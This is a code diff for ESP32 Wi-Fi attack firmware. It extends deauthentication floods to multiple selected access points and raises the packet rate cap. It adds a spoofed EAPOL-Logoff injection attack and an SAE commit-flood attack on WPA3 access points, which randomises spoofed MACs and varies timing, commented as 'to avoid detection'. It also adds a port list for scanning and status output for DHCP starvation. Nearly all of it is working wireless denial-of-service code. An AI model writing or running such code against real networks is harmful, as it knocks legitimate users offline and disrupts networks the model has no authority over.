@@ -45,10 +45,13 @@
 #define CHUNK_SIZE 8192
 #define MDNS_NAME_BUF_LEN 65
 #define ARP_DELAY_MS 500
-#define MAX_PACKETS_PER_SECOND 200
+#define MAX_PACKETS_PER_SECOND 500
 
 #define BEACON_LIST_MAX 16
 #define BEACON_SSID_MAX_LEN 32
+
+// limit how many ap records we keep to avoid memory bloat/crashes
+#define MAX_SCANNED_APS 100
 
 static char g_beacon_list[BEACON_LIST_MAX][BEACON_SSID_MAX_LEN+1];
 static int g_beacon_list_count = 0;
@@ -58,11 +61,83 @@ static void wifi_beacon_list_task(void *param);
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
+
+station_ap_pair_t station_ap_list[MAX_STATIONS];
+int station_count = 0;
+void *beacon_task_handle = NULL;
+void *deauth_task_handle = NULL;
+int beacon_task_running = 0;
+
+const uint16_t COMMON_PORTS[] = {
+    20,    // FTP Data
+    21,    // FTP Control
+    22,    // SSH
+    23,    // Telnet
+    25,    // SMTP
+    53,    // DNS
+    69,    // TFTP
+    80,    // HTTP
+    88,    // Kerberos
+    110,   // POP3
+    111,   // RPCBind
+    123,   // NTP
+    135,   // MSRPC
+    137,   // NetBIOS Name Service
+    138,   // NetBIOS Datagram Service
+    139,   // NetBIOS Session Service
+    143,   // IMAP
+    161,   // SNMP
+    389,   // LDAP
+    443,   // HTTPS
+    445,   // SMB
+    465,   // SMTPS
+    500,   // IKE (VPN)
+    514,   // Syslog
+    515,   // LPD/LPR Printer
+    587,   // SMTP (submission)
+    631,   // IPP (Printing)
+    636,   // LDAPS
+    993,   // IMAPS
+    995,   // POP3S
+    1080,  // SOCKS Proxy
+    1433,  // MSSQL
+    1434,  // MSSQL Browser
+    1521,  // Oracle DB
+    1701,  // L2TP
+    1723,  // PPTP
+    1883,  // MQTT
+    2049,  // NFS
+    2082,  // cPanel
+    2083,  // cPanel SSL
+    2086,  // WHM
+    2087,  // WHM SSL
+    2222,  // Alternative SSH
+    3306,  // MySQL
+    3389,  // RDP
+    5060,  // SIP
+    5222,  // XMPP
+    5432,  // PostgreSQL
+    5900,  // VNC
+    5901,  // VNC-1
+    5902,  // VNC-2
+    6379,  // Redis
+    8080,  // HTTP Proxy
+    8443,  // HTTPS Alt
+    8883,  // MQTT SSL
+    9100,  // Printer
+    27017, // MongoDB
+    32400, // Plex Media Server
+    51820, // Wireguard
+    55443  // Alt HTTP
+};
+const size_t NUM_PORTS = sizeof(COMMON_PORTS) / sizeof(COMMON_PORTS[0]);
 static char PORTALURL[512] = "";
 static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
+wifi_ap_record_t *selected_aps = NULL;
+int selected_ap_count = 0;
 static station_ap_pair_t selected_station;
 static bool station_selected = false;
 bool redirect_handled = false;
@@ -1238,10 +1313,23 @@ void wifi_manager_stop_scan() {
     printf("Found %u access points\n", initial_ap_count);
     TERMINAL_VIEW_ADD_TEXT("Found %u access points\n", initial_ap_count);
 
+    // truncate to avoid excessive memory usage
+    if (initial_ap_count > MAX_SCANNED_APS) {
+        printf("too many aps (%u). truncating list to first %d\n", initial_ap_count, MAX_SCANNED_APS);
+        TERMINAL_VIEW_ADD_TEXT("showing first %d aps (truncated)\n", MAX_SCANNED_APS);
+        initial_ap_count = MAX_SCANNED_APS;
+    }
+
     if (initial_ap_count > 0) {
         if (scanned_aps != NULL) {
             free(scanned_aps);
             scanned_aps = NULL;
+        }
+        
+        if (selected_aps != NULL) {
+            free(selected_aps);
+            selected_aps = NULL;
+            selected_ap_count = 0;
         }
 
         scanned_aps = calloc(initial_ap_count, sizeof(wifi_ap_record_t));
@@ -1457,11 +1545,10 @@ void wifi_deauth_task(void *param) {
     uint32_t last_log = 0;
     
     while (1) {
-        if (strlen((const char *)selected_ap.ssid) > 0) {
-            for (int i = 0; i < ap_count; i++) {
-                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
-                    // Deauth on the AP's channel
-                    {
+        if (selected_ap_count > 0 && selected_aps != NULL) {
+            for (int sel_idx = 0; sel_idx < selected_ap_count; sel_idx++) {
+                for (int i = 0; i < ap_count; i++) {
+                    if (memcmp(ap_info[i].bssid, selected_aps[sel_idx].bssid, 6) == 0) {
                         int ch = ap_info[i].primary;
                         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                         wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
@@ -1472,6 +1559,20 @@ void wifi_deauth_task(void *param) {
                         }
                         vTaskDelay(pdMS_TO_TICKS(50));
                     }
+                }
+            }
+        } else if (strlen((const char *)selected_ap.ssid) > 0) {
+            for (int i = 0; i < ap_count; i++) {
+                if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
+                    int ch = ap_info[i].primary;
+                    uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+                    wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
+                    for (int j = 0; j < station_count; j++) {
+                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                            wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                        }
+                    }
+                    vTaskDelay(pdMS_TO_TICKS(50));
                 }
             }
         } else {
@@ -1505,6 +1606,30 @@ void wifi_manager_start_deauth() {
         ap_manager_stop_services();
         esp_wifi_start();
         printf("Restarting Wi-Fi\n");
+        
+        if (selected_ap_count > 0 && selected_aps != NULL) {
+            printf("Starting deauth attack on %d selected APs:\n", selected_ap_count);
+            TERMINAL_VIEW_ADD_TEXT("Starting deauth attack on %d selected APs:\n", selected_ap_count);
+            
+            for (int i = 0; i < selected_ap_count; i++) {
+                char sanitized_ssid[33];
+                sanitize_ssid_and_check_hidden(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
+                printf("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X)\n", 
+                       i, sanitized_ssid,
+                       selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
+                       selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5]);
+                TERMINAL_VIEW_ADD_TEXT("  [%d] %s\n", i, sanitized_ssid);
+            }
+        } else if (strlen((const char *)selected_ap.ssid) > 0) {
+            char sanitized_ssid[33];
+            sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
+            printf("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
+            TERMINAL_VIEW_ADD_TEXT("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
+        } else {
+            printf("Starting global deauth attack on all APs\n");
+            TERMINAL_VIEW_ADD_TEXT("Starting global deauth attack on all APs\n");
+        }
+        
         xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
         rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
@@ -1537,6 +1662,19 @@ void wifi_manager_select_ap(int index) {
 
     selected_ap = scanned_aps[index];
 
+    if (selected_aps != NULL) {
+        free(selected_aps);
+        selected_aps = NULL;
+    }
+
+    selected_aps = malloc(sizeof(wifi_ap_record_t));
+    if (selected_aps != NULL) {
+        selected_aps[0] = selected_ap;
+        selected_ap_count = 1;
+    } else {
+        selected_ap_count = 0;
+    }
+
     char sanitized_ssid[33];
     sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
 
@@ -1551,6 +1689,88 @@ void wifi_manager_select_ap(int index) {
 
     printf("Selected Access Point Successfully\n");
     TERMINAL_VIEW_ADD_TEXT("Selected Access Point Successfully\n");
+}
+
+void wifi_manager_select_multiple_aps(int *indices, int count) {
+    if (ap_count == 0) {
+        printf("No access points found\n");
+        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
+        return;
+    }
+
+    if (scanned_aps == NULL) {
+        printf("No AP info available (scanned_aps is NULL)\n");
+        TERMINAL_VIEW_ADD_TEXT("No AP info available (scanned_aps is NULL)\n");
+        return;
+    }
+
+    if (count <= 0) {
+        printf("Invalid count: %d\n", count);
+        TERMINAL_VIEW_ADD_TEXT("Invalid count: %d\n", count);
+        return;
+    }
+
+    for (int i = 0; i < count; i++) {
+        if (indices[i] < 0 || indices[i] >= ap_count) {
+            printf("Invalid index: %d. Index should be between 0 and %d\n", indices[i], ap_count - 1);
+            TERMINAL_VIEW_ADD_TEXT("Invalid index: %d. Index should be between 0 and %d\n", indices[i], ap_count - 1);
+            return;
+        }
+    }
+
+    if (selected_aps != NULL) {
+        free(selected_aps);
+        selected_aps = NULL;
+    }
+
+    selected_aps = malloc(count * sizeof(wifi_ap_record_t));
+    if (selected_aps == NULL) {
+        printf("Failed to allocate memory for selected APs\n");
+        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for selected APs\n");
+        selected_ap_count = 0;
+        return;
+    }
+
+    selected_ap_count = count;
+
+    for (int i = 0; i < count; i++) {
+        selected_aps[i] = scanned_aps[indices[i]];
+    }
+
+    selected_ap = selected_aps[0];
+
+    printf("Selected %d Access Points:\n", count);
+    TERMINAL_VIEW_ADD_TEXT("Selected %d Access Points:\n", count);
+
+    for (int i = 0; i < count; i++) {
+        char sanitized_ssid[33];
+        sanitize_ssid_and_check_hidden(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
+
+        printf("[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X%s\n",
+               i, sanitized_ssid,
+               selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
+               selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
+               (i == 0) ? " (Primary)" : "");
+
+        TERMINAL_VIEW_ADD_TEXT("[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X%s\n",
+               i, sanitized_ssid,
+               selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
+               selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
+               (i == 0) ? " (Primary)" : "");
+    }
+
+    printf("Multiple APs selected successfully. Primary AP: %s\n", 
+           (char*)selected_ap.ssid);
+    TERMINAL_VIEW_ADD_TEXT("Multiple APs selected successfully.\n");
+}
+
+void wifi_manager_get_selected_aps(wifi_ap_record_t **aps, int *count) {
+    if (aps != NULL) {
+        *aps = selected_aps;
+    }
+    if (count != NULL) {
+        *count = selected_ap_count;
+    }
 }
 
 void wifi_manager_select_station(int index) {
@@ -2485,14 +2705,16 @@ void wifi_manager_print_scan_results_with_oui() {
 
         printf("[%u] SSID: %s,\n"
                "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
-               "     RSSI: %d,\n",
+               "     RSSI: %d,\n"
+               "     Channel: %d,\n",
                i, sanitized_ssid, 
                scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
                scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
                scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-               scanned_aps[i].rssi);
+               scanned_aps[i].rssi,
+               scanned_aps[i].primary);
 
-#ifdef CONFIG_IDF_TARGET_ESP32C5 && CONFIG_IDF_TARGET_ESP32C6
+#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
         {
             int ch = scanned_aps[i].primary;
             const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
@@ -2553,12 +2775,14 @@ void wifi_manager_print_scan_results_with_oui() {
 
         TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
                                "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
-                               "     RSSI: %d,\n",
+                               "     RSSI: %d,\n"
+                               "     Channel: %d,\n",
                                i, sanitized_ssid, 
                                scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
                                scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
                                scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-                               scanned_aps[i].rssi);
+                               scanned_aps[i].rssi,
+                               scanned_aps[i].primary);
 
 #ifdef CONFIG_IDF_TARGET_ESP32C5
         {
@@ -3047,6 +3271,11 @@ void wifi_manager_start_station_scan() {
             if (err == ESP_OK) {
                  printf("Initial scan found %u access points\n", initial_ap_count);
                  TERMINAL_VIEW_ADD_TEXT("Initial scan found %u APs\n", initial_ap_count);
+                if (initial_ap_count > MAX_SCANNED_APS) {
+                    printf("too many aps (%u). truncating list to first %d\n", initial_ap_count, MAX_SCANNED_APS);
+                    TERMINAL_VIEW_ADD_TEXT("showing first %d aps (truncated)\n", MAX_SCANNED_APS);
+                    initial_ap_count = MAX_SCANNED_APS;
+                }
                 if (initial_ap_count > 0) {
                     if (scanned_aps != NULL) {
                         free(scanned_aps);
@@ -3375,6 +3604,8 @@ static void dhcp_starve_display_task(void *param) {
         uint32_t pps = interval / 5;
         printf("DHCP-Starve rate: %lu pps, Total: %lu packets\n", 
                (unsigned long)pps, (unsigned long)total);
+        TERMINAL_VIEW_ADD_TEXT("DHCP-Starve rate: %lu pps, Total: %lu packets\n", 
+               (unsigned long)pps, (unsigned long)total);
     }
     vTaskDelete(NULL);
 }
@@ -3389,6 +3620,7 @@ void wifi_manager_start_dhcpstarve(int threads) {
     }
     if (dhcp_starve_running) {
         printf("DHCP-Starve already running\n");
+        TERMINAL_VIEW_ADD_TEXT("DHCP-Starve already running\n");
         return;
     }
     dhcp_starve_running = true;
@@ -3400,6 +3632,7 @@ void wifi_manager_start_dhcpstarve(int threads) {
 void wifi_manager_stop_dhcpstarve(void) {
     if (!dhcp_starve_running) {
         printf("DHCP-Starve not running\n");
+        TERMINAL_VIEW_ADD_TEXT("DHCP-Starve not running\n");
         return;
     }
     dhcp_starve_running = false;
@@ -3407,8 +3640,400 @@ void wifi_manager_stop_dhcpstarve(void) {
 
 void wifi_manager_dhcpstarve_display(void) {
     printf("Packets sent so far: %lu\n", (unsigned long)dhcp_starve_packets_sent);
+    TERMINAL_VIEW_ADD_TEXT("Packets sent so far: %lu\n", (unsigned long)dhcp_starve_packets_sent);
 }
 
 void wifi_manager_dhcpstarve_help(void) {
-    printf("Usage: dhcpstarve start [threads]\\n       dhcpstarve stop\\n       dhcpstarve display\\n");
+    printf("Usage: dhcpstarve start [threads]\n       dhcpstarve stop\n       dhcpstarve display\n");
+    TERMINAL_VIEW_ADD_TEXT("Usage: dhcpstarve start [threads]\n       dhcpstarve stop\n       dhcpstarve display\n");
+}
+
+// Add EAPOL Logoff Attack support
+static volatile bool eapol_logoff_running = false;
+static volatile uint32_t eapol_logoff_packets_sent = 0;
+static TaskHandle_t eapol_logoff_task_handle = NULL;
+static TaskHandle_t eapol_logoff_display_task_handle = NULL;
+static uint32_t eapol_attack_delay_ms = 10;
+
+// Template for EAPOL Logoff frame: Data frame header + LLC/SNAP + EAPOL header
+static const uint8_t eapol_logoff_frame_template[36] = {
+    0x08, 0x01,                   // Frame Control: Data, ToDS=1, FromDS=0
+    0x00, 0x00,                   // Duration
+    // addr1 (dest), addr2 (src), addr3 (bssid) placeholders
+    0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
+    0x00, 0x00,                   // SeqCtrl
+    // LLC/SNAP
+    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E,
+    // EAPOL header: version 1, type Logoff(2), length 0
+    0x01, 0x02, 0x00, 0x00
+};
+
+static void eapol_logoff_task(void *param) {
+    (void)param;
+    uint8_t frame[sizeof(eapol_logoff_frame_template)];
+    while (eapol_logoff_running) {
+        // Copy template
+        memcpy(frame, eapol_logoff_frame_template, sizeof(frame));
+        
+        if (station_selected) {
+            // target specific selected station
+            uint8_t *ap_bssid = selected_station.ap_bssid;
+            uint8_t *sta_mac = selected_station.station_mac;
+            
+            // set channel to ap's channel
+            for (int i = 0; i < ap_count; i++) {
+                if (memcmp(scanned_aps[i].bssid, ap_bssid, 6) == 0) {
+                    esp_wifi_set_channel(scanned_aps[i].primary, WIFI_SECOND_CHAN_NONE);
+                    break;
+                }
+            }
+            
+            memcpy(&frame[4], ap_bssid, 6);     // dest: ap
+            memcpy(&frame[10], sta_mac, 6);     // src: station
+            memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
+            
+            esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+            eapol_logoff_packets_sent++;
+        } else if (strlen((const char *)selected_ap.ssid) > 0) {
+            // target selected ap - send logoff for all its stations
+            uint8_t *ap_bssid = selected_ap.bssid;
+            
+            // set channel
+            esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
+            
+            // send logoff for each known station on this ap
+            bool sent_any = false;
+            for (int j = 0; j < station_count; j++) {
+                if (memcmp(station_ap_list[j].ap_bssid, ap_bssid, 6) == 0) {
+                    memcpy(&frame[4], ap_bssid, 6);                           // dest: ap
+                    memcpy(&frame[10], station_ap_list[j].station_mac, 6);    // src: station
+                    memcpy(&frame[16], ap_bssid, 6);                          // bssid: ap
+                    
+                    esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+                    eapol_logoff_packets_sent++;
+                    sent_any = true;
+                    vTaskDelay(pdMS_TO_TICKS(5));
+                }
+            }
+            if (!sent_any) {
+                // no stations found, send generic logoff with random station mac
+                printf("no stations found for this ap.\nattack more effective with discovered stations\n");
+                TERMINAL_VIEW_ADD_TEXT("no stations found for this ap.\nattack more effective with discovered stations\n");
+                uint8_t fake_sta[6];
+                esp_fill_random(fake_sta, 6);
+                fake_sta[0] &= 0xFE; fake_sta[0] |= 0x02;
+                
+                memcpy(&frame[4], ap_bssid, 6);     // dest: ap
+                memcpy(&frame[10], fake_sta, 6);    // src: fake station
+                memcpy(&frame[16], ap_bssid, 6);    // bssid: ap
+                
+                esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
+                eapol_logoff_packets_sent++;
+            }
+        } else {
+            // no target selected, skip
+            printf("no ap or station selected for eapol logoff\n");
+            TERMINAL_VIEW_ADD_TEXT("no ap or station selected for eapol logoff\n");
+            break;
+        }
+        
+        vTaskDelay(pdMS_TO_TICKS(eapol_attack_delay_ms));
+    }
+    vTaskDelete(NULL);
+}
+
+static void eapol_logoff_display_task(void *param) {
+    (void)param;
+    uint32_t prev_total = 0;
+    while (eapol_logoff_running) {
+        vTaskDelay(pdMS_TO_TICKS(5000));
+        uint32_t total = eapol_logoff_packets_sent;
+        uint32_t interval = total - prev_total;
+        prev_total = total;
+        uint32_t pps = interval / 5;
+        printf("EAPOL-Logoff rate: %lu pps, Total: %lu packets\n", (unsigned long)pps, (unsigned long)total);
+        TERMINAL_VIEW_ADD_TEXT("EAPOL-Logoff rate: %lu pps, Total: %lu packets\n", (unsigned long)pps, (unsigned long)total);
+    }
+    vTaskDelete(NULL);
+}
+
+void wifi_manager_start_eapollogoff_attack(void) {
+    if (eapol_logoff_running) {
+        printf("EAPOL Logoff already running\n");
+        TERMINAL_VIEW_ADD_TEXT("EAPOL Logoff already running\n");
+        return;
+    }
+    eapol_logoff_running = true;
+    eapol_logoff_packets_sent = 0;
+    xTaskCreate(eapol_logoff_task, "eapol_logoff", 2048, NULL, 5, &eapol_logoff_task_handle);
+    xTaskCreate(eapol_logoff_display_task, "eapol_disp", 2048, NULL, 5, &eapol_logoff_display_task_handle);
+}
+
+void wifi_manager_stop_eapollogoff_attack(void) {
+    if (!eapol_logoff_running && eapol_logoff_task_handle == NULL) {
+        printf("EAPOL Logoff not running\n");
+        TERMINAL_VIEW_ADD_TEXT("EAPOL Logoff not running\n");
+        return;
+    }
+    // signal tasks to stop
+    eapol_logoff_running = false;
+    // delete attack task if exists
+    if (eapol_logoff_task_handle) {
+        vTaskDelete(eapol_logoff_task_handle);
+        eapol_logoff_task_handle = NULL;
+    }
+    // delete display task if exists
+    if (eapol_logoff_display_task_handle) {
+        vTaskDelete(eapol_logoff_display_task_handle);
+        eapol_logoff_display_task_handle = NULL;
+    }
+}
+
+void wifi_manager_eapollogoff_display(void) {
+    printf("EAPOL-Logoff packets so far: %lu\n", (unsigned long)eapol_logoff_packets_sent);
+    TERMINAL_VIEW_ADD_TEXT("EAPOL-Logoff packets so far: %lu\n", (unsigned long)eapol_logoff_packets_sent);
+}
+
+void wifi_manager_eapollogoff_help(void) {
+    printf("Usage: attack -e (for EAPOL logoff attack)\n");
+    TERMINAL_VIEW_ADD_TEXT("Usage: attack -e (for EAPOL logoff attack)\n");
+}
+
+// SAE Handshake Flooding Attack Implementation
+static TaskHandle_t sae_flood_task_handle = NULL;
+static TaskHandle_t sae_flood_display_task_handle = NULL;
+static bool sae_flood_running = false;
+static int sae_flood_packets_sent = 0;
+static uint8_t sae_target_bssid[6];
+static int sae_target_channel = 1;
+static int sae_injection_rate = 25;
+
+// SAE Commit frame template (simplified for ESP32)
+static const uint8_t SAE_COMMIT_TEMPLATE[] = {
+    // 802.11 Authentication frame header
+    0xb0, 0x00,                     // Frame Control (Authentication)
+    0x00, 0x00,                     // Duration
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Destination (will be filled)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be filled)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be filled)
+    0x00, 0x00,                     // Sequence Control
+    
+    // Authentication frame body
+    0x03, 0x00,                     // Algorithm (SAE = 3)
+    0x01, 0x00,                     // Transaction Sequence (Commit = 1)
+    0x00, 0x00,                     // Status Code (Success = 0)
+    0x13, 0x00,                     // Group ID (19 = P-256)
+    
+    // Simplified scalar (32 bytes for P-256)
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
+    0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10,
+    0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18,
+    0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x20,
+    
+    // Simplified element (64 bytes for P-256 - X and Y coordinates)
+    0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28,
+    0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30,
+    0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
+    0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40,
+    0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48,
+    0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50,
+    0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58,
+    0x59, 0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60
+};
+
+static void inject_sae_commit_frame(uint8_t* src_mac, int frame_counter) {
+    uint8_t frame[sizeof(SAE_COMMIT_TEMPLATE)];
+    memcpy(frame, SAE_COMMIT_TEMPLATE, sizeof(SAE_COMMIT_TEMPLATE));
+    
+    // Fill in MAC addresses
+    memcpy(frame + 4, sae_target_bssid, 6);   // Destination (AP)
+    memcpy(frame + 10, src_mac, 6);           // Source (spoofed client)
+    memcpy(frame + 16, sae_target_bssid, 6);  // BSSID
+    
+    // Randomize scalar and element to create unique frames
+    for (int i = 32; i < sizeof(SAE_COMMIT_TEMPLATE); i++) {
+        frame[i] = esp_random() & 0xFF;
+    }
+    
+    // Add some randomization to sequence control for better variation
+    uint16_t seq = (esp_random() & 0xFFF0) | (frame_counter & 0x000F);
+    frame[22] = seq & 0xFF;
+    frame[23] = (seq >> 8) & 0xFF;
+    
+    // Vary the Group ID occasionally for more diversity
+    if ((frame_counter % 50) == 0) {
+        uint16_t group_ids[] = {19, 20, 21}; // P-256, P-384, P-521
+        uint16_t group_id = group_ids[esp_random() % 3];
+        frame[30] = group_id & 0xFF;
+        frame[31] = (group_id >> 8) & 0xFF;
+    }
+    
+    // Inject the frame
+    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+    sae_flood_packets_sent++;
+}
+
+static void sae_flood_task(void *param) {
+    uint8_t spoofed_mac[6];
+    uint8_t base_mac[6];
+    int frame_counter = 0;
+    
+    // Get base MAC address
+    esp_wifi_get_mac(WIFI_IF_STA, base_mac);
+    
+    printf("SAE flood attack started on channel %d\n", sae_target_channel);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack started on channel %d\n", sae_target_channel);
+    printf("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+           sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
+           sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
+    TERMINAL_VIEW_ADD_TEXT("Target BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", 
+                          sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
+                          sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
+    printf("Injection rate: %d frames/second\n", sae_injection_rate);
+    TERMINAL_VIEW_ADD_TEXT("Injection rate: %d frames/second\n", sae_injection_rate);
+    
+    while (sae_flood_running) {
+        // Generate spoofed MAC address
+        memcpy(spoofed_mac, base_mac, 6);
+        spoofed_mac[4] = (frame_counter >> 8) & 0xFF;
+        spoofed_mac[5] = frame_counter & 0xFF;
+        
+        // Inject SAE commit frame
+        inject_sae_commit_frame(spoofed_mac, frame_counter);
+        
+        frame_counter = (frame_counter + 1) % 65536;
+        
+        // Rate limiting with variation to avoid detection
+        int variation = (esp_random() % 20) - 10; // +/- 10% variation
+        int actual_rate = sae_injection_rate + (sae_injection_rate * variation / 100);
+        if (actual_rate < 50) actual_rate = 50; // minimum rate
+        if (actual_rate > 200) actual_rate = 200; // reduced maximum rate
+        
+        // Ensure minimum delay to prevent watchdog timeout
+        int delay_ms = 1000 / actual_rate;
+        if (delay_ms < 5) delay_ms = 5; // minimum 5ms delay
+        vTaskDelay(pdMS_TO_TICKS(delay_ms));
+        
+        // Yield to other tasks every 10 frames
+        if ((frame_counter % 10) == 0) {
+            taskYIELD();
+        }
+    }
+    
+    printf("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood task stopped. Total frames sent: %d\n", sae_flood_packets_sent);
+    sae_flood_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+static void sae_flood_display_task(void *param) {
+    int last_count = 0;
+    
+    while (sae_flood_running) {
+        int frames_in_period = sae_flood_packets_sent - last_count;
+        int current_rate = frames_in_period / 5;
+        last_count = sae_flood_packets_sent;
+        
+        printf("SAE Flood: %d frames/sec | Total: %d frames\n", 
+               current_rate, sae_flood_packets_sent);
+        TERMINAL_VIEW_ADD_TEXT("SAE Flood: %d frames/sec | Total: %d frames\n", 
+                              current_rate, sae_flood_packets_sent);
+        
+        vTaskDelay(pdMS_TO_TICKS(5000));
+    }
+    
+    sae_flood_display_task_handle = NULL;
+    vTaskDelete(NULL);
+}
+
+void wifi_manager_start_sae_flood(void) {
+#if !defined(CONFIG_IDF_TARGET_ESP32C5) && !defined(CONFIG_IDF_TARGET_ESP32C6)
+    printf("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack only supported on ESP32-C5 and ESP32-C6\n");
+    return;
+#endif
+
+    if (sae_flood_running) {
+        printf("SAE flood attack already running\n");
+        TERMINAL_VIEW_ADD_TEXT("SAE flood attack already running\n");
+        return;
+    }
+
+    if (ap_count == 0 || scanned_aps == NULL) {
+        printf("No AP selected. Use 'select -a <index>' first\n");
+        TERMINAL_VIEW_ADD_TEXT("No AP selected. Use 'select -a <index>' first\n");
+        return;
+    }
+    
+    bool supports_wpa3 = false;
+    if (selected_ap.authmode == WIFI_AUTH_WPA3_PSK || 
+        selected_ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK ||
+        selected_ap.authmode == WIFI_AUTH_WPA3_ENTERPRISE) {
+        supports_wpa3 = true;
+    }
+
+    if (!supports_wpa3) {
+        printf("Selected AP does not support WPA3/SAE authentication\n");
+        TERMINAL_VIEW_ADD_TEXT("Selected AP does not support WPA3/SAE authentication\n");
+        printf("AP Auth Mode: %d (WPA3 required)\n", selected_ap.authmode);
+        TERMINAL_VIEW_ADD_TEXT("AP Auth Mode: %d (WPA3 required)\n", selected_ap.authmode);
+        return;
+    }
+
+    memcpy(sae_target_bssid, selected_ap.bssid, 6);
+    sae_target_channel = selected_ap.primary;
+    sae_injection_rate = 100;
+    sae_flood_packets_sent = 0;
+    sae_flood_running = true;
+
+    wifi_manager_start_monitor_mode(NULL);
+    esp_wifi_set_channel(sae_target_channel, WIFI_SECOND_CHAN_NONE);
+
+    xTaskCreate(sae_flood_task, "sae_flood_task", 4096, NULL, 5, &sae_flood_task_handle);
+    xTaskCreate(sae_flood_display_task, "sae_flood_display", 2048, NULL, 3, &sae_flood_display_task_handle);
+
+    char bssid_str[18];
+    snprintf(bssid_str, sizeof(bssid_str), "%02x:%02x:%02x:%02x:%02x:%02x",
+             sae_target_bssid[0], sae_target_bssid[1], sae_target_bssid[2],
+             sae_target_bssid[3], sae_target_bssid[4], sae_target_bssid[5]);
+
+    printf("SAE flood attack started against %s (%s) on channel %d\n", 
+           selected_ap.ssid, bssid_str, sae_target_channel);
+    TERMINAL_VIEW_ADD_TEXT("SAE flood attack started against %s (%s) on channel %d\n", 
+                          selected_ap.ssid, bssid_str, sae_target_channel);
+}
+
